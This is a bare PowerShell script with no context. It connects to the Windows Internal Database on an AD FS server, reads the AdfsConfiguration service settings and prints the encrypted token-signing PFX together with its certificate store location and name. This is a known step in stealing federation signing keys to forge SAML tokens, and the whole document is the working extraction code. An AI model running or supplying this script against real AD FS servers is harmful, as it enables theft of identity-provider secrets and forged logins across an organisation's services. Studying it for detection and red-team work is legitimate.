Import-Module SqlServer

$ReadEncryptedPfxQuery = "SELECT ServiceSettingsData FROM {0}.IdentityServerPolicy.ServiceSettings"
$connectionString = "Data Source=np:\\.\pipe\microsoft##wid\tsql\query;Integrated Security=True"


function Read-EncryptedPfx {
        param (
            [string]$dbName,
            [System.Data.SqlClient.SqlConnection]$conn
        )
        $query = $ReadEncryptedPfxQuery -f $dbName
        $cmd = New-Object System.Data.SqlClient.SqlCommand($query, $conn)
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $xmlString = $reader["ServiceSettingsData"]
            $xmlDocument = New-Object System.Xml.XmlDocument
            $xmlDocument.LoadXml($xmlString)
            $root = $xmlDocument.DocumentElement
            $signingToken = $root.GetElementsByTagName("SigningToken")[0]
            if ($signingToken) {
                $encryptedPfx = $signingToken.GetElementsByTagName("EncryptedPfx")[0].InnerText
                $findValue = $signingToken.GetElementsByTagName("FindValue")[0].InnerText
                $storeLocationValue = $signingToken.GetElementsByTagName("StoreLocationValue")[0].InnerText
                $storeNameValue = $signingToken.GetElementsByTagName("StoreNameValue")[0].InnerText
                Write-Output "Encrypted Token Signing Key: $encryptedPfx"
                Write-Output "Certificate value: $findValue"
                Write-Output "Store location value: $storeLocationValue"
                Write-Output "Store name value: $storeNameValue"
            }
        }
        $reader.Close()
    }
    
    # Adfs2012R2 = "AdfsConfiguration"
    # Adfs2016 = "AdfsConfigurationV3"
    # Adfs2019 = "AdfsConfigurationV4"
    $dbname= "AdfsConfigurationV4"
    $conn = New-Object System.Data.SqlClient.SqlConnection($connectionString)
    $conn.open()
    Read-EncryptedPfx -dbName $dbname -conn $conn
